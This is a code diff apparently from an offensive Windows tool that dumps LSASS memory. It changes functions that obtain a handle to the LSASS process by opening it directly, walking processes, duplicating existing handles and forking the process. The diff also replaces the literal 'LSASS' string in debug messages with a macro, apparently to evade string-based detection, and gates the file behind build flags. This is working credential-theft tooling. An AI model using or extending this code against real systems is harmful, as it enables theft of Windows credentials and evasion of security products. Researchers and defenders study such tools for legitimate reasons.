@@ -3,6 +3,8 @@
 #include "modules.h"
 #include "malseclogon.h"
 
+#if defined(NANO) && !defined(SSP)
+
 /*
  * "The DuplicateHandle system call has an interesting behaviour
  * when using the pseudo current process handle, which has the value -1.
@@ -53,7 +55,7 @@ HANDLE obtain_lsass_handle(
     if (is_malseclogon_stage_2)
     {
         // this is always done from an EXE
-#ifndef BOF
+#ifdef EXE
         hProcess = malseclogon_stage_2(
             dump_path
         );
@@ -62,7 +64,7 @@ HANDLE obtain_lsass_handle(
     // duplicate an existing handle to LSASS
     else if (dup)
     {
-        DPRINT("Trying to find an existing LSASS handle to duplicate");
+        DPRINT("Trying to find an existing " LSASS " handle to duplicate");
         hProcess = duplicate_lsass_handle(
             lsass_pid,
             permissions
@@ -71,7 +73,7 @@ HANDLE obtain_lsass_handle(
     // good old NtOpenProcess
     else if (lsass_pid)
     {
-        DPRINT("Using NtOpenProcess to get a handle to LSASS");
+        DPRINT("Using NtOpenProcess to get a handle to " LSASS);
         hProcess = get_process_handle(
             lsass_pid,
             permissions,
@@ -83,14 +85,14 @@ HANDLE obtain_lsass_handle(
     {
         // the variable lsass_pid should always be set
         // this branch won't be called
-        DPRINT("Using NtGetNextProcess to get a handle to LSASS");
+        DPRINT("Using NtGetNextProcess to get a handle to " LSASS);
         hProcess = find_lsass(
             permissions
         );
     }
     if (hProcess)
     {
-        DPRINT("LSASS handle: 0x%lx", (DWORD)(ULONG_PTR)hProcess);
+        DPRINT(LSASS " handle: 0x%lx", (DWORD)(ULONG_PTR)hProcess);
     }
     return hProcess;
 }
@@ -111,13 +113,13 @@ HANDLE find_lsass(DWORD dwFlags)
         );
         if (status == STATUS_NO_MORE_ENTRIES)
         {
-            PRINT_ERR("The LSASS process was not found. Are you elevated?");
+            PRINT_ERR("The " LSASS " process was not found. Are you elevated?");
             return NULL;
         }
         if (!NT_SUCCESS(status))
         {
             syscall_failed("NtGetNextProcess", status);
-            DPRINT_ERR("Could not find the LSASS process");
+            DPRINT_ERR("Could not find the " LSASS " process");
             return NULL;
         }
         if (is_lsass(hProcess))
@@ -441,7 +443,7 @@ HANDLE duplicate_lsass_handle(
             {
                 // found LSASS handle
                 DPRINT(
-                    "Found LSASS handle: 0x%x, on process: %d",
+                    "Found " LSASS " handle: 0x%x, on process: %d",
                     handleInfo->HandleValue,
                     handleInfo->UniqueProcessId
                 );
@@ -458,7 +460,7 @@ HANDLE duplicate_lsass_handle(
         }
     }
 
-    PRINT_ERR("No handle to the LSASS process was found");
+    PRINT_ERR("No handle to the " LSASS " process was found");
     intFree(handleTableInformation); handleTableInformation = NULL;
     intFree(process_list); process_list = NULL;
     return NULL;
@@ -484,7 +486,7 @@ HANDLE fork_process(
         );
         if (!hProcess)
         {
-            DPRINT_ERR("Could not fork LSASS");
+            DPRINT_ERR("Could not fork " LSASS);
             return NULL;
         }
     }
@@ -514,13 +516,13 @@ HANDLE fork_process(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtCreateProcess", status);
-        DPRINT_ERR("Could not fork LSASS");
+        DPRINT_ERR("Could not fork " LSASS);
         hCloneProcess = NULL;
     }
     else
     {
         DPRINT(
-            "Forked the LSASS process, new handle: 0x%lx",
+            "Forked the " LSASS " process, new handle: 0x%lx",
             (DWORD)(ULONG_PTR)hCloneProcess
         );
     }
@@ -528,3 +530,5 @@ HANDLE fork_process(
     NtClose(hProcess); hProcess = NULL;
     return hCloneProcess;
 }
+
+#endif
